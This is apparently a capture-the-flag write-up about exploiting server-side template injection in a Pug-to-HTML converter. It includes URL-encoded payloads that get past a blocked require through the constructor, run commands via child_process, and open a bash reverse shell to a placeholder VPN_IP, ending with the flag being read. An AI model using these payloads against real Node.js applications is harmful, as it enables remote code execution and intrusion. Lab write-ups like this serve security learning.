Let's check the website out:

We are dealing with something called `PUG to HTML Converter`, **Pug** (formerly called Jade) is a server-side templating engine for Node.js that uses indentation and terse syntax to generate HTML. Under the hood, Pug compiles these templates into JavaScript functions that build an HTML string. Any interpolation tags, like `#{…}` (escaped) or `!{…}` (unescaped), are evaluated as JavaScript expressions at render time.

Let's check an exploit for this:

We got RCE via SSTI, let's proceed to exploitation.

# EXPLOITATION

First of all, we should send the request to our proxy, I'll be using Caido:

As seen, we got a `template` parameter, let's try doing the SSTI:

```
template=doctype+html%0Ahead%0A++title+Test%0Ah1+Result%3A+%23%7B7*7%7D
```

![](cybersecurity/images/Pasted%2520image%252020250606122035.png)


As seen, we get:

```html
<pre>&lt;!DOCTYPE html&gt;&lt;head&gt;&lt;title&gt;Test&lt;/title&gt;&lt;/head&gt;&lt;h1&gt;Result: 49&lt;/h1&gt;</pre>
```


That means `7*7` is being evaluated so, SSTI works, let's try reading more files and even attempt the RCE, let's try using the `require` function:

```js
template=h1+%23%7Brequire%28%27child_process%27%29.execSync%28%27id%27%29.toString%28%29%7D
```


![](cybersecurity/images/Pasted%2520image%252020250606122552.png)

Require seems to be disabled on here, we can do a little trick with the `constructor` function:

```js
template=h1+%23%7Bthis.constructor.constructor%28%22return+process%22%29%28%29.mainModule.require%28%27child_process%27%29.execSync%28%27id%27%29.toString%28%29%7D
```

![](cybersecurity/images/Pasted%2520image%252020250606122635.png)

There we go, `rce` works, let's send ourselves a reverse shell now:

```js
template=h1+%23%7Bthis.constructor.constructor%28%22return+process%22%29%28%29.mainModule.require%28%27child_process%27%29.execSync%28%22bash+-c+%27bash+-i+%3E%26+/dev/tcp/VPN_IP/4444+0%3E%261%27%22%29%7D
```

![](cybersecurity/images/Pasted%2520image%252020250606122827.png)

Nice, we got our shell, no need to perform privilege escalation, we can simply read our flag:

```
find / -type f -name "flag.txt" 2>/dev/null\
/usr/src/app/flag.txt

user@774c7a0d6226:/tmp$ cat /usr/src/app/flag.txt
flag{3cfca66f3611059a0dfbc4191a0803b2}
```
